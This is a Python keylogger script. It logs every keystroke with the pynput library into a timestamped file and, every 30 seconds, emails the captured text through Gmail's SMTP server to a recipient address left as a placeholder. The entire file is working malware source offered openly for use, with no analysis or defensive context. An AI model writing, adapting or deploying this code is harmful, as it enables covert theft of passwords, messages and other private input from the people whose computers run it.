import datetime, time
from pynput.keyboard import Listener


def key_listener():

    #ACTUAL DATE
    d = datetime.datetime.now().strftime('%y-%m-%d_%H-%M-%S')
            
    #CREATES A FILE WITH ACTUAL DATE
    file_name = 'keylogger_{}.txt'.format(d)
    f = open(file_name, 'w')

    #INITIAL TIME
    time0=time.time()

#SEND MAIL FUNCTION
    def send_email():

        import smtplib

        with open(file_name, 'r+') as f:
            data = f.read()
            
        try:

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()

            #INSERT YOR EMAIL, password and the recipient INTO THE "login" and "sendmail" FUNCTIONS.
            server.login('your_email','pasw_email')
            server.sendmail('your_email', 'recep_email',data)

            print('EMAIL HAS BEEN SENT CORRECTLY!')
            server.quit()
            key_listener()

        except:

            print('EMAIL HAS NOT BEEN SENT :(')
            server.quit()
            key_listener()

#KEY RECORDER FUNCTION
    def key_recorder(key):
        key = str(key)
        if key == 'Key.ctrl':
            f.write('')
        elif key == 'Key.enter':
            f.write('\n')
        elif key == 'Key.space':
            f.write(' ')
        elif key == 'Key.backspace':
            f.write('%BORRAR%')
        elif key == 'Key.shift_r':
            f.write('')
        elif key == '<65027>':
            f.write('')
        else:
            f.write(key.replace("'", ""))

#EVERY 30 SECONDS CLOSE THE FILE AND CALL THE FUNCTION SEND_EMAIL
        if time.time()-time0 > 30:
            f.close()
            send_email()

    with Listener(on_press=key_recorder) as listener:
        listener.join()


#STARTS CICLE
while True:
    key_listener()
